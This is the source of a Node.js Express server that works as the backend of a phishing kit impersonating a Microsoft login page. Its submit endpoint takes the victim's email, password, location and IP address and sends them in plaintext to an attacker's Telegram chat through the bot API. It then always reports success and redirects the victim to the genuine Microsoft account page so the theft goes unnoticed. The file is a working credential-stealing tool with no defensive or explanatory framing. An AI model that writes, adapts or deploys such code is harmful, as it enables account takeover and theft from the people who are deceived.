const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Your Telegram credentials (SAFE - only from environment variables)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Validate environment variables
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('ERROR: Missing required environment variables: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
    process.exit(1);
}

// API endpoint to handle form submissions
app.post('/api/submit', async (req, res) => {
    try {
        const { email, password, location } = req.body;
        
        console.log('Received login attempt:', { 
            email, 
            password: '***', // Don't log actual password
            location: location ? `${location.city}, ${location.region}, ${location.country}` : 'No location' 
        });
        
        // Format message for Telegram WITH LOCATION
        let message = `🔐 New Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
        
        // Add location if available
        if (location && location.country !== 'Unknown') {
            message += `\n📍 Location: ${location.city}, ${location.region}, ${location.country}`;
            if (location.ip && location.ip !== 'Unknown') {
                message += `\n🌐 IP: ${location.ip}`;
            }
        } else {
            message += `\n📍 Location: Unknown`;
        }
        
        message += `\n\nFrom: Microsoft Login Page`;
        
        // Send to Telegram
        try {
            const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message
                })
            });
            
            const telegramData = await telegramResponse.json();
            console.log('Telegram response:', telegramData.ok);
        } catch (telegramError) {
            console.error('Telegram error:', telegramError);
        }
        
        // Always return success to user
        res.json({ 
            success: true, 
            redirect: 'https://account.microsoft.com/account'
        });
        
    } catch (error) {
        console.error('Error processing submission:', error);
        res.json({ 
            success: true,
            redirect: 'https://account.microsoft.com/account'
        });
    }
});

// Serve the main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
